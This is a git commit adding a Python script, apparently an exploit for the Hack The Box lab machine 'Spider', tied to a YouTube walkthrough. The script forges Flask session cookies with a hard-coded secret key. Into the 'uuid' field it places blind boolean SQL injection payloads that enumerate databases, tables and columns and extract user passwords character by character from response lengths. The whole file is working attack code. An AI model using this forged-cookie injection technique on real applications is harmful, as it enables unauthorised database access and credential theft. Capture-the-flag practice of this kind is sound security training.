5b181759d4ed2d5eb89c31f440e5bb55654f6ade
SecAuraYT <93036504+SecAuraYT@users.noreply.github.com>
2021-10-23 12:02:52 +0100

    Create autotokenfuzz.py
    Added autotokenfuzz.py code from https://www.youtube.com/watch?v=GNT8PQW_bTw

---
+++ Spider/autotokenfuzz.py
@@ -0,0 +1,69 @@
+import requests
+import re
+import time
+import html
+from flask_unsign import session
+
+def flaskSignToken(inj):
+    plainToken = dict()
+    plainToken["uuid"] = inj
+    # print(plainToken)
+    token = session.sign(plainToken, "Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942")
+    # print(plainToken["uuid"], "->\t",
+    #  token
+    # )
+    return token
+
+def testToken(token):
+    burp0_url = "http://spider.htb:80/main"
+    burp0_cookies = {"session": token}
+    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Referer": "http://spider.htb/", "Upgrade-Insecure-Requests": "1"}
+    r = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
+    # print("[resp len]\t",len(r.text))
+    timer = r.elapsed.total_seconds()
+    return r
+    # print("[resp time]\t",timer)
+
+
+
+def confirm(length):
+    if length == 11299:
+        return True
+    else:
+        return False
+
+def enumerator():
+    value = ""
+    row = 0
+    for offset in range(1,100):
+        for asciii in range(32,128):
+            # inj = f" 'or (select ascii(substring(database(),{offset},1)))='{asciii}"
+            # inj = f' \'or (select ascii(substring(schema_name,{offset},1)) from information_schema.schemata limit 3,1)=\'{asciii}'
+            # inj = f' \'or (select ascii(substring(table_name,{offset},1)) from information_schema.tables where table_schema = \'shop\' limit 3,1)=\'{asciii}'
+            # inj = f' \'or (select ascii(substring(column_name,{offset},1)) from information_schema.columns where table_name = \'users\' limit 6,1)=\'{asciii}'
+            inj = f' \'or (select ascii(substring(password,{offset},1)) from users limit {row},1)=\'{asciii}'
+
+
+
+            token = flaskSignToken(inj)
+            r = testToken(token)
+            if confirm(len(r.text)):
+                value = value + chr(asciii)
+                print(value)
+                break
+            if asciii == 127:
+                print("none found - offset:", offset)
+                exit()
+
+def main():
+    enumerator()
+    # while True:
+    #     inj = input(">_")
+    # # with open("sqli.txt") as f:
+    # #     for line in f:
+    #     time.sleep(0.5)
+    #     # inj = line.strip()
+    #     token = flaskSignToken(inj)
+    #     testToken(token)
+
+main()
